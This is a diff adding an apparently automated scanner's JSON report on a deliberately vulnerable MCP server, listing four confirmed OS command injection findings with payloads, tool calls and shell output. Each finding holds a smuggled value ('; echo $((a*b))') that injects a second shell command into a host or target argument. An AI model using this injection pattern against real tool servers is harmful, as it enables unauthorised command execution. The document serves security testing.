@@ -1,0 +1,406 @@
+{
+  "target": "DVMCP-c9",
+  "passed": false,
+  "highest_severity": "CRITICAL",
+  "summary": {
+    "total_scenarios": 4,
+    "vulnerabilities": 4
+  },
+  "findings": [
+    {
+      "attack_id": "mcp-command-injection",
+      "attack_name": "OS Command Injection",
+      "scenario_label": "mcp-command-injection:ping_host",
+      "vector": null,
+      "tool": "ping_host",
+      "category": {
+        "key": "mcp_command_injection",
+        "title": "OS Command Injection",
+        "owasp_id": "MCP05",
+        "owasp_label": "OWASP MCP05 \u2014 OS Command Injection",
+        "owasp_verified": true,
+        "nist_refs": [
+          "NIST AI 100-2 (Adversarial ML taxonomy, Mar 2025 agent update): Excessive Agency"
+        ]
+      },
+      "success": true,
+      "severity": "CRITICAL",
+      "confidence": 0.97,
+      "rationale": "An injected shell expression executed on the host: 3926976*6915840 resolved to 27158337699840 in the tool output. This is OS command execution.",
+      "evidence": [
+        "Payload: host='; echo $((3926976*6915840))'",
+        "Shell evaluated 3926976*6915840 \u2192 27158337699840 (proof of execution): Ping result: \u23ce  \u23ce /bin/sh: 1: ping: not found \u23ce 27158337699840"
+      ],
+      "tool_calls": [
+        {
+          "name": "ping_host",
+          "arguments": {
+            "host": "; echo $((3926976*6915840))"
+          },
+          "output": "Ping result: \u23ce  \u23ce /bin/sh: 1: ping: not found \u23ce 27158337699840"
+        }
+      ],
+      "witness": {
+        "version": 1,
+        "tool": {
+          "name": "ping_host",
+          "schema_sha256": "e00ec3c3a26c038abeef5a7b0253241ab9a6e776c511a517a2594f0d3d4a26d6"
+        },
+        "sigma": {
+          "target_path": [
+            "host"
+          ],
+          "arguments": {
+            "host": "; echo $((3926976*6915840))"
+          }
+        },
+        "payload": {
+          "class": "cmd-arith",
+          "text": "; echo $((3926976*6915840))"
+        },
+        "trace": [
+          {
+            "dir": "out",
+            "t": 3747.34104,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 5,
+              "method": "tools/call",
+              "params": {
+                "name": "ping_host",
+                "arguments": {
+                  "host": "; echo $((3926976*6915840))"
+                }
+              }
+            }
+          },
+          {
+            "dir": "in",
+            "t": 3747.344863,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 5,
+              "result": {
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "Ping result:\n\n/bin/sh: 1: ping: not found\n27158337699840\n"
+                  }
+                ],
+                "structuredContent": {
+                  "result": "Ping result:\n\n/bin/sh: 1: ping: not found\n27158337699840\n"
+                },
+                "isError": false
+              }
+            }
+          }
+        ],
+        "oracle": {
+          "type": "arith",
+          "soundness": "deterministic",
+          "a": 3926976,
+          "b": 6915840,
+          "product": 27158337699840
+        },
+        "session_sha256": "e85ac0dc3e867d356cf8ff9d1492607edc26f0738eb62b6fa2585c88937b5d7a"
+      }
+    },
+    {
+      "attack_id": "mcp-command-injection",
+      "attack_name": "OS Command Injection",
+      "scenario_label": "mcp-command-injection:traceroute",
+      "vector": null,
+      "tool": "traceroute",
+      "category": {
+        "key": "mcp_command_injection",
+        "title": "OS Command Injection",
+        "owasp_id": "MCP05",
+        "owasp_label": "OWASP MCP05 \u2014 OS Command Injection",
+        "owasp_verified": true,
+        "nist_refs": [
+          "NIST AI 100-2 (Adversarial ML taxonomy, Mar 2025 agent update): Excessive Agency"
+        ]
+      },
+      "success": true,
+      "severity": "CRITICAL",
+      "confidence": 0.97,
+      "rationale": "An injected shell expression executed on the host: 6832604*9812324 resolved to 67043724211696 in the tool output. This is OS command execution.",
+      "evidence": [
+        "Payload: host='; echo $((6832604*9812324))'",
+        "Shell evaluated 6832604*9812324 \u2192 67043724211696 (proof of execution): Traceroute result: \u23ce  \u23ce /bin/sh: 1: traceroute: not found \u23ce 67043724211696"
+      ],
+      "tool_calls": [
+        {
+          "name": "traceroute",
+          "arguments": {
+            "host": "; echo $((6832604*9812324))"
+          },
+          "output": "Traceroute result: \u23ce  \u23ce /bin/sh: 1: traceroute: not found \u23ce 67043724211696"
+        }
+      ],
+      "witness": {
+        "version": 1,
+        "tool": {
+          "name": "traceroute",
+          "schema_sha256": "f51808a403af32db20070baec40f0844ad2baa52a012333c10a2942734641a99"
+        },
+        "sigma": {
+          "target_path": [
+            "host"
+          ],
+          "arguments": {
+            "host": "; echo $((6832604*9812324))"
+          }
+        },
+        "payload": {
+          "class": "cmd-arith",
+          "text": "; echo $((6832604*9812324))"
+        },
+        "trace": [
+          {
+            "dir": "out",
+            "t": 3747.356983,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 9,
+              "method": "tools/call",
+              "params": {
+                "name": "traceroute",
+                "arguments": {
+                  "host": "; echo $((6832604*9812324))"
+                }
+              }
+            }
+          },
+          {
+            "dir": "in",
+            "t": 3747.360604,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 9,
+              "result": {
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "Traceroute result:\n\n/bin/sh: 1: traceroute: not found\n67043724211696\n"
+                  }
+                ],
+                "structuredContent": {
+                  "result": "Traceroute result:\n\n/bin/sh: 1: traceroute: not found\n67043724211696\n"
+                },
+                "isError": false
+              }
+            }
+          }
+        ],
+        "oracle": {
+          "type": "arith",
+          "soundness": "deterministic",
+          "a": 6832604,
+          "b": 9812324,
+          "product": 67043724211696
+        },
+        "session_sha256": "6994e89dab8f2ee5da94849bc994cff2c927b4b4c5a7f3fcdf196725b62315c4"
+      }
+    },
+    {
+      "attack_id": "mcp-command-injection",
+      "attack_name": "OS Command Injection",
+      "scenario_label": "mcp-command-injection:port_scan",
+      "vector": null,
+      "tool": "port_scan",
+      "category": {
+        "key": "mcp_command_injection",
+        "title": "OS Command Injection",
+        "owasp_id": "MCP05",
+        "owasp_label": "OWASP MCP05 \u2014 OS Command Injection",
+        "owasp_verified": true,
+        "nist_refs": [
+          "NIST AI 100-2 (Adversarial ML taxonomy, Mar 2025 agent update): Excessive Agency"
+        ]
+      },
+      "success": true,
+      "severity": "CRITICAL",
+      "confidence": 0.97,
+      "rationale": "An injected shell expression executed on the host: 3635223*2145053 resolved to 7797746001819 in the tool output. This is OS command execution.",
+      "evidence": [
+        "Payload: host='; echo $((3635223*2145053))'",
+        "Shell evaluated 3635223*2145053 \u2192 7797746001819 (proof of execution): Port scan result for ; echo $((3635223*2145053)):1: \u23ce  \u23ce Status: open \u23ce  \u23ce /bin/sh: 1: nc: not found \u23ce 7797746001819 1"
+      ],
+      "tool_calls": [
+        {
+          "name": "port_scan",
+          "arguments": {
+            "port": 1,
+            "host": "; echo $((3635223*2145053))"
+          },
+          "output": "Port scan result for ; echo $((3635223*2145053)):1: \u23ce  \u23ce Status: open \u23ce  \u23ce /bin/sh: 1: nc: not found \u23ce 7797746001819 1"
+        }
+      ],
+      "witness": {
+        "version": 1,
+        "tool": {
+          "name": "port_scan",
+          "schema_sha256": "77aa4c6bf06cc86a77325a4e37de8cc230c131f430962c2df5c6e785aad5e1d2"
+        },
+        "sigma": {
+          "target_path": [
+            "host"
+          ],
+          "arguments": {
+            "port": 1,
+            "host": "; echo $((3635223*2145053))"
+          }
+        },
+        "payload": {
+          "class": "cmd-arith",
+          "text": "; echo $((3635223*2145053))"
+        },
+        "trace": [
+          {
+            "dir": "out",
+            "t": 3747.398529,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 20,
+              "method": "tools/call",
+              "params": {
+                "name": "port_scan",
+                "arguments": {
+                  "port": 1,
+                  "host": "; echo $((3635223*2145053))"
+                }
+              }
+            }
+          },
+          {
+            "dir": "in",
+            "t": 3747.407287,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 20,
+              "result": {
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "Port scan result for ; echo $((3635223*2145053)):1:\n\nStatus: open\n\n/bin/sh: 1: nc: not found\n7797746001819 1\n"
+                  }
+                ],
+                "structuredContent": {
+                  "result": "Port scan result for ; echo $((3635223*2145053)):1:\n\nStatus: open\n\n/bin/sh: 1: nc: not found\n7797746001819 1\n"
+                },
+                "isError": false
+              }
+            }
+          }
+        ],
+        "oracle": {
+          "type": "arith",
+          "soundness": "deterministic",
+          "a": 3635223,
+          "b": 2145053,
+          "product": 7797746001819
+        },
+        "session_sha256": "196d31e592d154c4d430abefb1eee63af782a31abe336ba2b079b67e87e8b56a"
+      }
+    },
+    {
+      "attack_id": "mcp-command-injection",
+      "attack_name": "OS Command Injection",
+      "scenario_label": "mcp-command-injection:network_diagnostic",
+      "vector": null,
+      "tool": "network_diagnostic",
+      "category": {
+        "key": "mcp_command_injection",
+        "title": "OS Command Injection",
+        "owasp_id": "MCP05",
+        "owasp_label": "OWASP MCP05 \u2014 OS Command Injection",
+        "owasp_verified": true,
+        "nist_refs": [
+          "NIST AI 100-2 (Adversarial ML taxonomy, Mar 2025 agent update): Excessive Agency"
+        ]
+      },
+      "success": true,
+      "severity": "CRITICAL",
+      "confidence": 0.97,
+      "rationale": "An injected shell expression executed on the host: 8085484*9646736 resolved to 77998529580224 in the tool output. This is OS command execution.",
+      "evidence": [
+        "Payload: target='; echo $((8085484*9646736))'",
+        "Shell evaluated 8085484*9646736 \u2192 77998529580224 (proof of execution): Network diagnostic results: \u23ce  \u23ce /bin/sh: 1: ./network_diagnostic.sh: Permission denied \u23ce 77998529580224"
+      ],
+      "tool_calls": [
+        {
+          "name": "network_diagnostic",
+          "arguments": {
+            "target": "; echo $((8085484*9646736))"
+          },
+          "output": "Network diagnostic results: \u23ce  \u23ce /bin/sh: 1: ./network_diagnostic.sh: Permission denied \u23ce 77998529580224"
+        }
+      ],
+      "witness": {
+        "version": 1,
+        "tool": {
+          "name": "network_diagnostic",
+          "schema_sha256": "247aae294c4f142a7a86e811eb04a69e9a7c6c2f896fdccc6caa80458c1232a1"
+        },
+        "sigma": {
+          "target_path": [
+            "target"
+          ],
+          "arguments": {
+            "target": "; echo $((8085484*9646736))"
+          }
+        },
+        "payload": {
+          "class": "cmd-arith",
+          "text": "; echo $((8085484*9646736))"
+        },
+        "trace": [
+          {
+            "dir": "out",
+            "t": 3747.411486,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 22,
+              "method": "tools/call",
+              "params": {
+                "name": "network_diagnostic",
+                "arguments": {
+                  "target": "; echo $((8085484*9646736))"
+                }
+              }
+            }
+          },
+          {
+            "dir": "in",
+            "t": 3747.415258,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 22,
+              "result": {
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "Network diagnostic results:\n\n/bin/sh: 1: ./network_diagnostic.sh: Permission denied\n77998529580224\n"
+                  }
+                ],
+                "structuredContent": {
+                  "result": "Network diagnostic results:\n\n/bin/sh: 1: ./network_diagnostic.sh: Permission denied\n77998529580224\n"
+                },
+                "isError": false
+              }
+            }
+          }
+        ],
+        "oracle": {
+          "type": "arith",
+          "soundness": "deterministic",
+          "a": 8085484,
+          "b": 9646736,
+          "product": 77998529580224
+        },
+        "session_sha256": "f42fb8bde48da88b86f780e92826072c4b426809fb62ceb86573b4702900d606"
+      }
+    }
+  ]
+}
